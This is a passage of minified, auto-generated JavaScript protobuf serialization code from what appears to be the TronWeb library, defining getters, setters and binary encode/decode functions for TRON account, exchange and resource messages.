        TronWebProto.Exchange.prototype.getSecondTokenId_asU8 = function() {
            return e.Message.bytesAsU8(this.getSecondTokenId())
        }
        ,
        TronWebProto.Exchange.prototype.setSecondTokenId = function(n) {
            return e.Message.setProto3BytesField(this, 8, n)
        }
        ,
        TronWebProto.Exchange.prototype.getSecondTokenBalance = function() {
            return e.Message.getFieldWithDefault(this, 9, 0)
        }
        ,
        TronWebProto.Exchange.prototype.setSecondTokenBalance = function(n) {
            return e.Message.setProto3IntField(this, 9, n)
        }
        ,
        TronWebProto.Account.repeatedFields_ = [5, 7, 16, 33],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Account.prototype.toObject = function(n) {
            return TronWebProto.Account.toObject(n, this)
        }
        ,
        TronWebProto.Account.toObject = function(n, s) {
            var a, l = {
                accountName: s.getAccountName_asB64(),
                type: e.Message.getFieldWithDefault(s, 2, 0),
                address: s.getAddress_asB64(),
                balance: e.Message.getFieldWithDefault(s, 4, 0),
                votesList: e.Message.toObjectList(s.getVotesList(), TronWebProto.Vote.toObject, n),
                assetMap: (a = s.getAssetMap()) ? a.toObject(n, void 0) : [],
                assetv2Map: (a = s.getAssetv2Map()) ? a.toObject(n, void 0) : [],
                frozenList: e.Message.toObjectList(s.getFrozenList(), TronWebProto.Account.Frozen.toObject, n),
                netUsage: e.Message.getFieldWithDefault(s, 8, 0),
                acquiredDelegatedFrozenBalanceForBandwidth: e.Message.getFieldWithDefault(s, 41, 0),
                delegatedFrozenBalanceForBandwidth: e.Message.getFieldWithDefault(s, 42, 0),
                oldTronPower: e.Message.getFieldWithDefault(s, 46, 0),
                tronPower: (a = s.getTronPower()) && TronWebProto.Account.Frozen.toObject(n, a),
                assetOptimized: e.Message.getBooleanFieldWithDefault(s, 60, !1),
                createTime: e.Message.getFieldWithDefault(s, 9, 0),
                latestOprationTime: e.Message.getFieldWithDefault(s, 10, 0),
                allowance: e.Message.getFieldWithDefault(s, 11, 0),
                latestWithdrawTime: e.Message.getFieldWithDefault(s, 12, 0),
                code: s.getCode_asB64(),
                isWitness: e.Message.getBooleanFieldWithDefault(s, 14, !1),
                isCommittee: e.Message.getBooleanFieldWithDefault(s, 15, !1),
                frozenSupplyList: e.Message.toObjectList(s.getFrozenSupplyList(), TronWebProto.Account.Frozen.toObject, n),
                assetIssuedName: s.getAssetIssuedName_asB64(),
                assetIssuedId: s.getAssetIssuedId_asB64(),
                latestAssetOperationTimeMap: (a = s.getLatestAssetOperationTimeMap()) ? a.toObject(n, void 0) : [],
                latestAssetOperationTimev2Map: (a = s.getLatestAssetOperationTimev2Map()) ? a.toObject(n, void 0) : [],
                freeNetUsage: e.Message.getFieldWithDefault(s, 19, 0),
                freeAssetNetUsageMap: (a = s.getFreeAssetNetUsageMap()) ? a.toObject(n, void 0) : [],
                freeAssetNetUsagev2Map: (a = s.getFreeAssetNetUsagev2Map()) ? a.toObject(n, void 0) : [],
                latestConsumeTime: e.Message.getFieldWithDefault(s, 21, 0),
                latestConsumeFreeTime: e.Message.getFieldWithDefault(s, 22, 0),
                accountId: s.getAccountId_asB64(),
                accountResource: (a = s.getAccountResource()) && TronWebProto.Account.AccountResource.toObject(n, a),
                codehash: s.getCodehash_asB64(),
                ownerPermission: (a = s.getOwnerPermission()) && TronWebProto.Permission.toObject(n, a),
                witnessPermission: (a = s.getWitnessPermission()) && TronWebProto.Permission.toObject(n, a),
                activePermissionList: e.Message.toObjectList(s.getActivePermissionList(), TronWebProto.Permission.toObject, n)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.Account.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Account;
            return TronWebProto.Account.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Account.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setAccountName(l);
                    break;
                case 2:
                    var l = s.readEnum();
                    n.setType(l);
                    break;
                case 3:
                    var l = s.readBytes();
                    n.setAddress(l);
                    break;
                case 4:
                    var l = s.readInt64();
                    n.setBalance(l);
                    break;
                case 5:
                    var l = new TronWebProto.Vote;
                    s.readMessage(l, TronWebProto.Vote.deserializeBinaryFromReader),
                    n.addVotes(l);
                    break;
                case 6:
                    var l = n.getAssetMap();
                    s.readMessage(l, function(f, h) {
                        e.Map.deserializeBinary(f, h, e.BinaryReader.prototype.readString, e.BinaryReader.prototype.readInt64, null, "", 0)
                    });
                    break;
                case 56:
                    var l = n.getAssetv2Map();
                    s.readMessage(l, function(f, h) {
                        e.Map.deserializeBinary(f, h, e.BinaryReader.prototype.readString, e.BinaryReader.prototype.readInt64, null, "", 0)
                    });
                    break;
                case 7:
                    var l = new TronWebProto.Account.Frozen;
                    s.readMessage(l, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                    n.addFrozen(l);
                    break;
                case 8:
                    var l = s.readInt64();
                    n.setNetUsage(l);
                    break;
                case 41:
                    var l = s.readInt64();
                    n.setAcquiredDelegatedFrozenBalanceForBandwidth(l);
                    break;
                case 42:
                    var l = s.readInt64();
                    n.setDelegatedFrozenBalanceForBandwidth(l);
                    break;
                case 46:
                    var l = s.readInt64();
                    n.setOldTronPower(l);
                    break;
                case 47:
                    var l = new TronWebProto.Account.Frozen;
                    s.readMessage(l, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                    n.setTronPower(l);
                    break;
                case 60:
                    var l = s.readBool();
                    n.setAssetOptimized(l);
                    break;
                case 9:
                    var l = s.readInt64();
                    n.setCreateTime(l);
                    break;
                case 10:
                    var l = s.readInt64();
                    n.setLatestOprationTime(l);
                    break;
                case 11:
                    var l = s.readInt64();
                    n.setAllowance(l);
                    break;
                case 12:
                    var l = s.readInt64();
                    n.setLatestWithdrawTime(l);
                    break;
                case 13:
                    var l = s.readBytes();
                    n.setCode(l);
                    break;
                case 14:
                    var l = s.readBool();
                    n.setIsWitness(l);
                    break;
                case 15:
                    var l = s.readBool();
                    n.setIsCommittee(l);
                    break;
                case 16:
                    var l = new TronWebProto.Account.Frozen;
                    s.readMessage(l, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                    n.addFrozenSupply(l);
                    break;
                case 17:
                    var l = s.readBytes();
                    n.setAssetIssuedName(l);
                    break;
                case 57:
                    var l = s.readBytes();
                    n.setAssetIssuedId(l);
                    break;
                case 18:
                    var l = n.getLatestAssetOperationTimeMap();
                    s.readMessage(l, function(f, h) {
                        e.Map.deserializeBinary(f, h, e.BinaryReader.prototype.readString, e.BinaryReader.prototype.readInt64, null, "", 0)
                    });
                    break;
                case 58:
                    var l = n.getLatestAssetOperationTimev2Map();
                    s.readMessage(l, function(f, h) {
                        e.Map.deserializeBinary(f, h, e.BinaryReader.prototype.readString, e.BinaryReader.prototype.readInt64, null, "", 0)
                    });
                    break;
                case 19:
                    var l = s.readInt64();
                    n.setFreeNetUsage(l);
                    break;
                case 20:
                    var l = n.getFreeAssetNetUsageMap();
                    s.readMessage(l, function(f, h) {
                        e.Map.deserializeBinary(f, h, e.BinaryReader.prototype.readString, e.BinaryReader.prototype.readInt64, null, "", 0)
                    });
                    break;
                case 59:
                    var l = n.getFreeAssetNetUsagev2Map();
                    s.readMessage(l, function(f, h) {
                        e.Map.deserializeBinary(f, h, e.BinaryReader.prototype.readString, e.BinaryReader.prototype.readInt64, null, "", 0)
                    });
                    break;
                case 21:
                    var l = s.readInt64();
                    n.setLatestConsumeTime(l);
                    break;
                case 22:
                    var l = s.readInt64();
                    n.setLatestConsumeFreeTime(l);
                    break;
                case 23:
                    var l = s.readBytes();
                    n.setAccountId(l);
                    break;
                case 26:
                    var l = new TronWebProto.Account.AccountResource;
                    s.readMessage(l, TronWebProto.Account.AccountResource.deserializeBinaryFromReader),
                    n.setAccountResource(l);
                    break;
                case 30:
                    var l = s.readBytes();
                    n.setCodehash(l);
                    break;
                case 31:
                    var l = new TronWebProto.Permission;
                    s.readMessage(l, TronWebProto.Permission.deserializeBinaryFromReader),
                    n.setOwnerPermission(l);
                    break;
                case 32:
                    var l = new TronWebProto.Permission;
                    s.readMessage(l, TronWebProto.Permission.deserializeBinaryFromReader),
                    n.setWitnessPermission(l);
                    break;
                case 33:
                    var l = new TronWebProto.Permission;
                    s.readMessage(l, TronWebProto.Permission.deserializeBinaryFromReader),
                    n.addActivePermission(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Account.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Account.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Account.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAccountName_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getType(),
            a !== 0 && s.writeEnum(2, a),
            a = n.getAddress_asU8(),
            a.length > 0 && s.writeBytes(3, a),
            a = n.getBalance(),
            a !== 0 && s.writeInt64(4, a),
            a = n.getVotesList(),
            a.length > 0 && s.writeRepeatedMessage(5, a, TronWebProto.Vote.serializeBinaryToWriter),
            a = n.getAssetMap(!0),
            a && a.getLength() > 0 && a.serializeBinary(6, s, e.BinaryWriter.prototype.writeString, e.BinaryWriter.prototype.writeInt64),
            a = n.getAssetv2Map(!0),
            a && a.getLength() > 0 && a.serializeBinary(56, s, e.BinaryWriter.prototype.writeString, e.BinaryWriter.prototype.writeInt64),
            a = n.getFrozenList(),
            a.length > 0 && s.writeRepeatedMessage(7, a, TronWebProto.Account.Frozen.serializeBinaryToWriter),
            a = n.getNetUsage(),
            a !== 0 && s.writeInt64(8, a),
            a = n.getAcquiredDelegatedFrozenBalanceForBandwidth(),
            a !== 0 && s.writeInt64(41, a),
            a = n.getDelegatedFrozenBalanceForBandwidth(),
            a !== 0 && s.writeInt64(42, a),
            a = n.getOldTronPower(),
            a !== 0 && s.writeInt64(46, a),
            a = n.getTronPower(),
            a != null && s.writeMessage(47, a, TronWebProto.Account.Frozen.serializeBinaryToWriter),
            a = n.getAssetOptimized(),
            a && s.writeBool(60, a),
            a = n.getCreateTime(),
            a !== 0 && s.writeInt64(9, a),
            a = n.getLatestOprationTime(),
            a !== 0 && s.writeInt64(10, a),
            a = n.getAllowance(),
            a !== 0 && s.writeInt64(11, a),
            a = n.getLatestWithdrawTime(),
            a !== 0 && s.writeInt64(12, a),
            a = n.getCode_asU8(),
            a.length > 0 && s.writeBytes(13, a),
            a = n.getIsWitness(),
            a && s.writeBool(14, a),
            a = n.getIsCommittee(),
            a && s.writeBool(15, a),
            a = n.getFrozenSupplyList(),
            a.length > 0 && s.writeRepeatedMessage(16, a, TronWebProto.Account.Frozen.serializeBinaryToWriter),
            a = n.getAssetIssuedName_asU8(),
            a.length > 0 && s.writeBytes(17, a),
            a = n.getAssetIssuedId_asU8(),
            a.length > 0 && s.writeBytes(57, a),
            a = n.getLatestAssetOperationTimeMap(!0),
            a && a.getLength() > 0 && a.serializeBinary(18, s, e.BinaryWriter.prototype.writeString, e.BinaryWriter.prototype.writeInt64),
            a = n.getLatestAssetOperationTimev2Map(!0),
            a && a.getLength() > 0 && a.serializeBinary(58, s, e.BinaryWriter.prototype.writeString, e.BinaryWriter.prototype.writeInt64),
            a = n.getFreeNetUsage(),
            a !== 0 && s.writeInt64(19, a),
            a = n.getFreeAssetNetUsageMap(!0),
            a && a.getLength() > 0 && a.serializeBinary(20, s, e.BinaryWriter.prototype.writeString, e.BinaryWriter.prototype.writeInt64),
            a = n.getFreeAssetNetUsagev2Map(!0),
            a && a.getLength() > 0 && a.serializeBinary(59, s, e.BinaryWriter.prototype.writeString, e.BinaryWriter.prototype.writeInt64),
            a = n.getLatestConsumeTime(),
            a !== 0 && s.writeInt64(21, a),
            a = n.getLatestConsumeFreeTime(),
            a !== 0 && s.writeInt64(22, a),
            a = n.getAccountId_asU8(),
            a.length > 0 && s.writeBytes(23, a),
            a = n.getAccountResource(),
            a != null && s.writeMessage(26, a, TronWebProto.Account.AccountResource.serializeBinaryToWriter),
            a = n.getCodehash_asU8(),
            a.length > 0 && s.writeBytes(30, a),
            a = n.getOwnerPermission(),
            a != null && s.writeMessage(31, a, TronWebProto.Permission.serializeBinaryToWriter),
            a = n.getWitnessPermission(),
            a != null && s.writeMessage(32, a, TronWebProto.Permission.serializeBinaryToWriter),
            a = n.getActivePermissionList(),
            a.length > 0 && s.writeRepeatedMessage(33, a, TronWebProto.Permission.serializeBinaryToWriter)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Account.Frozen.prototype.toObject = function(n) {
            return TronWebProto.Account.Frozen.toObject(n, this)
        }
        ,
        TronWebProto.Account.Frozen.toObject = function(n, s) {
            var a = {
                frozenBalance: e.Message.getFieldWithDefault(s, 1, 0),
                expireTime: e.Message.getFieldWithDefault(s, 2, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Account.Frozen.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Account.Frozen;
            return TronWebProto.Account.Frozen.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Account.Frozen.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setFrozenBalance(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setExpireTime(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Account.Frozen.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Account.Frozen.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Account.Frozen.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getFrozenBalance(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getExpireTime(),
            a !== 0 && s.writeInt64(2, a)
        }
        ,
        TronWebProto.Account.Frozen.prototype.getFrozenBalance = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.Account.Frozen.prototype.setFrozenBalance = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.Account.Frozen.prototype.getExpireTime = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.Account.Frozen.prototype.setExpireTime = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Account.AccountResource.prototype.toObject = function(n) {
            return TronWebProto.Account.AccountResource.toObject(n, this)
        }
        ,
        TronWebProto.Account.AccountResource.toObject = function(n, s) {
            var a, l = {
                energyUsage: e.Message.getFieldWithDefault(s, 1, 0),
                frozenBalanceForEnergy: (a = s.getFrozenBalanceForEnergy()) && TronWebProto.Account.Frozen.toObject(n, a),
                latestConsumeTimeForEnergy: e.Message.getFieldWithDefault(s, 3, 0),
                acquiredDelegatedFrozenBalanceForEnergy: e.Message.getFieldWithDefault(s, 4, 0),
                delegatedFrozenBalanceForEnergy: e.Message.getFieldWithDefault(s, 5, 0),
                storageLimit: e.Message.getFieldWithDefault(s, 6, 0),
                storageUsage: e.Message.getFieldWithDefault(s, 7, 0),
                latestExchangeStorageTime: e.Message.getFieldWithDefault(s, 8, 0)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.Account.AccountResource.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Account.AccountResource;
            return TronWebProto.Account.AccountResource.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Account.AccountResource.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setEnergyUsage(l);
                    break;
                case 2:
                    var l = new TronWebProto.Account.Frozen;
                    s.readMessage(l, TronWebProto.Account.Frozen.deserializeBinaryFromReader),
                    n.setFrozenBalanceForEnergy(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setLatestConsumeTimeForEnergy(l);
                    break;
                case 4:
                    var l = s.readInt64();
                    n.setAcquiredDelegatedFrozenBalanceForEnergy(l);
                    break;
                case 5:
                    var l = s.readInt64();
                    n.setDelegatedFrozenBalanceForEnergy(l);
                    break;
                case 6:
                    var l = s.readInt64();
                    n.setStorageLimit(l);
                    break;
                case 7:
                    var l = s.readInt64();
                    n.setStorageUsage(l);
                    break;
                case 8:
                    var l = s.readInt64();
                    n.setLatestExchangeStorageTime(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Account.AccountResource.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Account.AccountResource.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Account.AccountResource.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getEnergyUsage(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getFrozenBalanceForEnergy(),
            a != null && s.writeMessage(2, a, TronWebProto.Account.Frozen.serializeBinaryToWriter),
            a = n.getLatestConsumeTimeForEnergy(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getAcquiredDelegatedFrozenBalanceForEnergy(),
            a !== 0 && s.writeInt64(4, a),
            a = n.getDelegatedFrozenBalanceForEnergy(),
            a !== 0 && s.writeInt64(5, a),
            a = n.getStorageLimit(),
            a !== 0 && s.writeInt64(6, a),
            a = n.getStorageUsage(),
            a !== 0 && s.writeInt64(7, a),
            a = n.getLatestExchangeStorageTime(),
            a !== 0 && s.writeInt64(8, a)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getEnergyUsage = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setEnergyUsage = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getFrozenBalanceForEnergy = function() {
            return e.Message.getWrapperField(this, TronWebProto.Account.Frozen, 2)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setFrozenBalanceForEnergy = function(n) {
            return e.Message.setWrapperField(this, 2, n)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.clearFrozenBalanceForEnergy = function() {
            return this.setFrozenBalanceForEnergy(void 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.hasFrozenBalanceForEnergy = function() {
            return e.Message.getField(this, 2) != null
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getLatestConsumeTimeForEnergy = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setLatestConsumeTimeForEnergy = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getAcquiredDelegatedFrozenBalanceForEnergy = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setAcquiredDelegatedFrozenBalanceForEnergy = function(n) {
            return e.Message.setProto3IntField(this, 4, n)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getDelegatedFrozenBalanceForEnergy = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setDelegatedFrozenBalanceForEnergy = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getStorageLimit = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setStorageLimit = function(n) {
            return e.Message.setProto3IntField(this, 6, n)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getStorageUsage = function() {
            return e.Message.getFieldWithDefault(this, 7, 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setStorageUsage = function(n) {
            return e.Message.setProto3IntField(this, 7, n)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.getLatestExchangeStorageTime = function() {
            return e.Message.getFieldWithDefault(this, 8, 0)
        }
        ,
        TronWebProto.Account.AccountResource.prototype.setLatestExchangeStorageTime = function(n) {
            return e.Message.setProto3IntField(this, 8, n)
        }
        ,
        TronWebProto.Account.prototype.getAccountName = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.Account.prototype.getAccountName_asB64 = function() {
            return e.Message.bytesAsB64(this.getAccountName())
        }
        ,
        TronWebProto.Account.prototype.getAccountName_asU8 = function() {
            return e.Message.bytesAsU8(this.getAccountName())
        }
        ,
        TronWebProto.Account.prototype.setAccountName = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.Account.prototype.getType = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.Account.prototype.setType = function(n) {
            return e.Message.setProto3EnumField(this, 2, n)
        }
        ,
        TronWebProto.Account.prototype.getAddress = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.Account.prototype.getAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAddress())
        }
        ,
        TronWebProto.Account.prototype.getAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAddress())
        }
        ,
        TronWebProto.Account.prototype.setAddress = function(n) {
            return e.Message.setProto3BytesField(this, 3, n)
        }
        ,
        TronWebProto.Account.prototype.getBalance = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.Account.prototype.setBalance = function(n) {
            return e.Message.setProto3IntField(this, 4, n)
        }
        ,
        TronWebProto.Account.prototype.getVotesList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Vote, 5)
        }
        ,
        TronWebProto.Account.prototype.setVotesList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 5, n)
        }
        ,
        TronWebProto.Account.prototype.addVotes = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 5, n, TronWebProto.Vote, s)
        }
        ,
        TronWebProto.Account.prototype.clearVotesList = function() {
            return this.setVotesList([])
        }
        ,
        TronWebProto.Account.prototype.getAssetMap = function(n) {
            return e.Message.getMapField(this, 6, n, null)
        }
        ,
        TronWebProto.Account.prototype.clearAssetMap = function() {
            return this.getAssetMap().clear(),
            this
        }
        ,
        TronWebProto.Account.prototype.getAssetv2Map = function(n) {
            return e.Message.getMapField(this, 56, n, null)
        }
        ,
        TronWebProto.Account.prototype.clearAssetv2Map = function() {
            return this.getAssetv2Map().clear(),
            this
        }
        ,
        TronWebProto.Account.prototype.getFrozenList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Account.Frozen, 7)
        }
        ,
        TronWebProto.Account.prototype.setFrozenList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 7, n)
        }
        ,
        TronWebProto.Account.prototype.addFrozen = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 7, n, TronWebProto.Account.Frozen, s)
        }
        ,
        TronWebProto.Account.prototype.clearFrozenList = function() {
            return this.setFrozenList([])
        }
        ,
        TronWebProto.Account.prototype.getNetUsage = function() {
            return e.Message.getFieldWithDefault(this, 8, 0)
        }
        ,
        TronWebProto.Account.prototype.setNetUsage = function(n) {
            return e.Message.setProto3IntField(this, 8, n)
        }
        ,
        TronWebProto.Account.prototype.getAcquiredDelegatedFrozenBalanceForBandwidth = function() {
            return e.Message.getFieldWithDefault(this, 41, 0)
        }
        ,
        TronWebProto.Account.prototype.setAcquiredDelegatedFrozenBalanceForBandwidth = function(n) {
            return e.Message.setProto3IntField(this, 41, n)
        }
        ,
        TronWebProto.Account.prototype.getDelegatedFrozenBalanceForBandwidth = function() {
            return e.Message.getFieldWithDefault(this, 42, 0)
        }
        ,
        TronWebProto.Account.prototype.setDelegatedFrozenBalanceForBandwidth = function(n) {
            return e.Message.setProto3IntField(this, 42, n)
        }
        ,
        TronWebProto.Account.prototype.getOldTronPower = function() {
            return e.Message.getFieldWithDefault(this, 46, 0)
        }
        ,
        TronWebProto.Account.prototype.setOldTronPower = function(n) {
            return e.Message.setProto3IntField(this, 46, n)
        }
        ,
        TronWebProto.Account.prototype.getTronPower = function() {
            return e.Message.getWrapperField(this, TronWebProto.Account.Frozen, 47)
        }
        ,
        TronWebProto.Account.prototype.setTronPower = function(n) {
            return e.Message.setWrapperField(this, 47, n)
        }
        ,
        TronWebProto.Account.prototype.clearTronPower = function() {
            return this.setTronPower(void 0)
        }
        ,
        TronWebProto.Account.prototype.hasTronPower = function() {
            return e.Message.getField(this, 47) != null
        }
        ,
        TronWebProto.Account.prototype.getAssetOptimized = function() {
            return e.Message.getBooleanFieldWithDefault(this, 60, !1)
        }
        ,
        TronWebProto.Account.prototype.setAssetOptimized = function(n) {
            return e.Message.setProto3BooleanField(this, 60, n)
        }
        ,
        TronWebProto.Account.prototype.getCreateTime = function() {
            return e.Message.getFieldWithDefault(this, 9, 0)
        }
        ,
        TronWebProto.Account.prototype.setCreateTime = function(n) {
            return e.Message.setProto3IntField(this, 9, n)
        }
        ,
        TronWebProto.Account.prototype.getLatestOprationTime = function() {
            return e.Message.getFieldWithDefault(this, 10, 0)
        }
        ,
        TronWebProto.Account.prototype.setLatestOprationTime = function(n) {
            return e.Message.setProto3IntField(this, 10, n)
        }
        ,
        TronWebProto.Account.prototype.getAllowance = function() {
            return e.Message.getFieldWithDefault(this, 11, 0)
        }
        ,
        TronWebProto.Account.prototype.setAllowance = function(n) {
            return e.Message.setProto3IntField(this, 11, n)
        }
        ,
        TronWebProto.Account.prototype.getLatestWithdrawTime = function() {
            return e.Message.getFieldWithDefault(this, 12, 0)
        }
        ,
        TronWebProto.Account.prototype.setLatestWithdrawTime = function(n) {
            return e.Message.setProto3IntField(this, 12, n)
        }
        ,
        TronWebProto.Account.prototype.getCode = function() {
            return e.Message.getFieldWithDefault(this, 13, "")
        }
        ,
        TronWebProto.Account.prototype.getCode_asB64 = function() {
            return e.Message.bytesAsB64(this.getCode())
        }
        ,
        TronWebProto.Account.prototype.getCode_asU8 = function() {
            return e.Message.bytesAsU8(this.getCode())
        }
        ,
        TronWebProto.Account.prototype.setCode = function(n) {
            return e.Message.setProto3BytesField(this, 13, n)
        }
        ,
        TronWebProto.Account.prototype.getIsWitness = function() {
            return e.Message.getBooleanFieldWithDefault(this, 14, !1)
        }
        ,
        TronWebProto.Account.prototype.setIsWitness = function(n) {
            return e.Message.setProto3BooleanField(this, 14, n)
        }
        ,
        TronWebProto.Account.prototype.getIsCommittee = function() {
            return e.Message.getBooleanFieldWithDefault(this, 15, !1)
        }
        ,
        TronWebProto.Account.prototype.setIsCommittee = function(n) {
            return e.Message.setProto3BooleanField(this, 15, n)
        }
        ,
        TronWebProto.Account.prototype.getFrozenSupplyList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Account.Frozen, 16)
        }
        ,
        TronWebProto.Account.prototype.setFrozenSupplyList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 16, n)
        }
        ,
        TronWebProto.Account.prototype.addFrozenSupply = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 16, n, TronWebProto.Account.Frozen, s)
        }
        ,
        TronWebProto.Account.prototype.clearFrozenSupplyList = function() {
            return this.setFrozenSupplyList([])
        }
        ,
        TronWebProto.Account.prototype.getAssetIssuedName = function() {
            return e.Message.getFieldWithDefault(this, 17, "")
        }
        ,
        TronWebProto.Account.prototype.getAssetIssuedName_asB64 = function() {
            return e.Message.bytesAsB64(this.getAssetIssuedName())
        }
        ,
        TronWebProto.Account.prototype.getAssetIssuedName_asU8 = function() {
            return e.Message.bytesAsU8(this.getAssetIssuedName())
        }
        ,
        TronWebProto.Account.prototype.setAssetIssuedName = function(n) {
            return e.Message.setProto3BytesField(this, 17, n)
        }
        ,
        TronWebProto.Account.prototype.getAssetIssuedId = function() {
            return e.Message.getFieldWithDefault(this, 57, "")
        }
        ,
        TronWebProto.Account.prototype.getAssetIssuedId_asB64 = function() {
            return e.Message.bytesAsB64(this.getAssetIssuedId())
        }
        ,
        TronWebProto.Account.prototype.getAssetIssuedId_asU8 = function() {
            return e.Message.bytesAsU8(this.getAssetIssuedId())
        }
        ,
        TronWebProto.Account.prototype.setAssetIssuedId = function(n) {
            return e.Message.setProto3BytesField(this, 57, n)
        }
        ,
        TronWebProto.Account.prototype.getLatestAssetOperationTimeMap = function(n) {
            return e.Message.getMapField(this, 18, n, null)
        }
        ,
        TronWebProto.Account.prototype.clearLatestAssetOperationTimeMap = function() {
            return this.getLatestAssetOperationTimeMap().clear(),
            this
        }
        ,
        TronWebProto.Account.prototype.getLatestAssetOperationTimev2Map = function(n) {
            return e.Message.getMapField(this, 58, n, null)
        }
        ,
        TronWebProto.Account.prototype.clearLatestAssetOperationTimev2Map = function() {
            return this.getLatestAssetOperationTimev2Map().clear(),
            this
        }
        ,
        TronWebProto.Account.prototype.getFreeNetUsage = function() {
            return e.Message.getFieldWithDefault(this, 19, 0)
        }
        ,
        TronWebProto.Account.prototype.setFreeNetUsage = function(n) {
            return e.Message.setProto3IntField(this, 19, n)
        }
        ,
        TronWebProto.Account.prototype.getFreeAssetNetUsageMap = function(n) {
            return e.Message.getMapField(this, 20, n, null)
        }
        ,
        TronWebProto.Account.prototype.clearFreeAssetNetUsageMap = function() {
            return this.getFreeAssetNetUsageMap().clear(),
            this
        }
        ,
        TronWebProto.Account.prototype.getFreeAssetNetUsagev2Map = function(n) {
            return e.Message.getMapField(this, 59, n, null)
        }
        ,
        TronWebProto.Account.prototype.clearFreeAssetNetUsagev2Map = function() {
